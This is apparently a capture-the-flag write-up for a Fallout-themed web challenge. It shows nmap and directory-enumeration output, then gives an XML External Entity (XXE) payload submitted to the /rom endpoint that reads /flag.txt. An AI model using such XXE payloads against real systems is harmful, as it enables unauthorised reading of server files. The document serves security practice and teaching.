# Jailbreak

## Description

The crew secures an experimental Pip-Boy from a black market merchant, recognizing its potential to unlock the heavily guarded bunker of Vault 79. Back at their hideout, the hackers and engineers collaborate to jailbreak the device, working meticulously to bypass its sophisticated biometric locks. Using custom firmware and a series of precise modifications, can you bring the device to full operational status in order to pair it with the vault door's access port. The flag is located in /flag.txt

## Recon

### Nmap scan

```
PORT STATE    SERVICE VERSION
31886/tcp filtered unknown
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.32 (97%), Linux 2.6.15 (97%), Linux 2.6.18 (97%), SonicWALL Aventail EX-1500 SSL VPN appliance (97%), Kronos InTouch timeclock (95%), Raritan Dominion KX II KVM switch (95%), Palo Alto PA-500 firewall (95%), Cisco IPS 4270 intrusion prevention system (94%), Cisco MDS 9509 switch (NX-OS 4.2) (94%), Essentia OpenWifless ESS (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 13 hops
```

### Directory Enumeration

```
map                  [32m (Status: 200) [0m [Size: 2246]
data                 [32m (Status: 200) [0m [Size: 6908]
radio                [32m (Status: 200) [0m [Size: 7281]
inventory            [32m (Status: 200) [0m [Size: 6573]
rom                  [32m (Status: 200) [0m [Size: 2347]
```

### Manual Recon the page and Visit `/rom`

Its a `XXE` vuln so
use this payload

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [
<!ENTITY xxe  SYSTEM  "file:///flag.txt">
]>
<FirmwareUpdateConfig>
    <Firmware>
<Version>&xxe;</Version>
    </Firmware>
</FirmwareUpdateConfig>
```
